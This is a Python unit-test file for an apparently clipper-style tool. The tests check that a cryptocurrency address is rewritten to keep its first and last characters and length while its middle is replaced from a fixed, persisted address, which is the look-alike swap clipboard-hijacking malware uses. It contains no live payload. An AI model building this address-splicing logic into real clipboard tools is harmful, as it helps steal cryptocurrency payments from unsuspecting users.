"""safe.splice 与固定地址固化路径的单元测试。"""

import os

import pytest

from clipper import safe


FIXED = "bc1qppp57wj0pay9krdhrs24npgev9sm3rahkhqmw4"  # 42 位 bech32


class TestSplice:
    @pytest.mark.parametrize(
        "original",
        [
            "1BitcoinEaterAddressDontSendf59kuE",  # BTC P2PKH,34 位
            "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",  # ETH EIP55,42 位
            "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",  # BTC P2WPKH,42 位
        ],
    )
    def test_length_preserved(self, original):
        out = safe.splice(original, FIXED)
        assert len(out) == len(original)

    @pytest.mark.parametrize(
        "original",
        [
            "1BitcoinEaterAddressDontSendf59kuE",
            "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
        ],
    )
    def test_head_and_tail_kept(self, original):
        out = safe.splice(original, FIXED)
        assert out[: safe.HEAD] == original[: safe.HEAD]
        assert out[-safe.TAIL :] == original[-safe.TAIL :]
        # 中段确实变了
        assert out != original

    def test_eth_prefix_intact(self):
        out = safe.splice("0xfb6916095ca1df60bb79ce92ce3ea74c37c5d359", FIXED)
        assert out.startswith("0x")

    def test_middle_cycled_when_longer_than_fixed(self):
        long_addr = "1" + "a" * 45 + "z"  # 47 位,超过固定地址中段长度
        out = safe.splice(long_addr, FIXED)
        assert len(out) == 47
        assert out[0] == "1" and out[-1] == "z"

    def test_too_short_returns_fixed(self):
        assert safe.splice("12345678", FIXED) == FIXED

    def test_deterministic(self):
        assert safe.splice("1BitcoinEaterAddressDontSendf59kuE", FIXED) == safe.splice(
            "1BitcoinEaterAddressDontSendf59kuE", FIXED
        )


class TestLoad:
    def test_creates_and_persists(self, tmp_path):
        cfg = tmp_path / "safe_address"
        first = safe.load(path=cfg)
        assert first.startswith("bc1q")
        assert cfg.read_text().strip() == first
        # 第二次读取同一地址(固化)
        assert safe.load(path=cfg) == first

    def test_force_regenerates(self, tmp_path):
        cfg = tmp_path / "safe_address"
        first = safe.load(path=cfg)
        second = safe.load(force=True, path=cfg)
        assert second != first
        assert cfg.read_text().strip() == second

    def test_generated_address_is_detectable(self, tmp_path):
        from clipper.detect import match_exact

        cfg = tmp_path / "safe_address"
        addr = safe.load(path=cfg)
        assert match_exact(addr) is not None

    def test_file_permission_0600(self, tmp_path):
        cfg = tmp_path / "sub" / "safe_address"
        safe.load(path=cfg)
        assert os.stat(cfg).st_mode & 0o777 == 0o600
